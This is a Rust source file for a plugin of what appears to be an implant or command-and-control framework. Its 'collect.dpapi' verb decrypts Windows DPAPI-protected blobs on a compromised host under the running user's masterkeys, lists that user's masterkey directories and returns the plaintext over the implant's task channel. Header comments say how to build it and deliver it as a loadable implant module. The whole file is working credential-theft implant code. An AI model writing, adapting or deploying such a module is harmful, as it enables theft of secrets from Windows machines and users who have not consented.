//! The credential collection family's second module (architecture.md
//! Sec 5.4): `collect.dpapi`, the DPAPI unsealing primitive -- one
//! discrete collection act whose halves stay honest about the context
//! they run in: the unseal opens the task's blob under the masterkeys
//! of the user the implant runs as, the readiness read reports that
//! user's masterkey directory, and both ride the task audit every
//! dispatched action already enters.
//!
//! The grammar gives one verb two actions -- `unseal` decrypts the
//! task's base64 blob and prints the plaintext as text or base64 by
//! what it is, `list` reports the masterkey SID directories (the
//! default: a bare task is a read). A blob sealed by another user or
//! another machine refuses naming the mismatch, not blaming the data.
//! Nothing lands on disk: this is the family's first verb with
//! nothing to drop -- the blob arrives as task text and the plaintext
//! rides back the task's channel into the audit chain.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load dpapi` task's content, then task `collect.dpapi` like
//! any compiled verb. A non-Windows build compiles for the lane and
//! refuses the verb at run time: the technique has no masterkeys to
//! open there.

mod arguments;
mod base64;
// The codec and rendering halves are pure and host-tested, but only
// the execution calls them -- the same not(windows) allowance the
// family's other pure halves carry, stated once at the module the
// whole tree of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod dpapi;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Dpapi;

impl Plugin for Dpapi {
    fn name(&self) -> &'static str {
        "dpapi"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("collect.dpapi", dpapi_verb)]
    }
}

fn dpapi_verb(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// running user's masterkeys.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::Unseal => unseal(arguments),
        Action::List => list(),
    }
}

/// The technique has no masterkeys off Windows; the manifest's targets
/// keep the module off other loads, and this refusal keeps a stray
/// dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "collect.dpapi: DPAPI unsealing is a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

#[cfg(windows)]
fn unseal(arguments: &Arguments) -> Result<String, String> {
    let blob = arguments.blob.as_deref().unwrap_or_default();
    // The grammar validated the base64; the second read is the same
    // bytes the protection API will take.
    let sealed = base64::decode(blob).expect("the grammar validated the blob");
    match dpapi::unseal(&sealed) {
        Ok(plain) => Ok(format!("unsealed {}", dpapi::render(&plain))),
        Err(status) => Err(format!("collect.dpapi: {}", dpapi::status_message(status))),
    }
}

/// The readiness read: the masterkey SID directories of the user the
/// implant runs as, sorted so two reads of one host compare line by
/// line -- the fact every unseal runs on.
#[cfg(windows)]
fn list() -> Result<String, String> {
    let mut directories = dpapi::masterkey_directories();
    directories.sort();
    Ok(if directories.is_empty() {
        "no masterkey directory for this user -- the unseal has no keys to open".to_string()
    } else {
        directories
            .iter()
            .map(|sid| format!("{sid} (the user's masterkey directory)"))
            .collect::<Vec<_>>()
            .join("\n")
    })
}

rod_plugin!(Dpapi);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports the
        // readiness facts and writes nothing -- on a non-Windows build
        // it refuses, naming why.
        #[cfg(windows)]
        {
            let output = dpapi_verb("").expect("the read runs");
            assert!(output.contains("masterkey"), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = dpapi_verb("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(dpapi_verb("decrypt AQID").is_err());
        assert!(dpapi_verb("unseal").is_err());
        assert!(dpapi_verb("unseal not base64!").is_err());
        assert!(dpapi_verb("list AQID").is_err());
    }
}
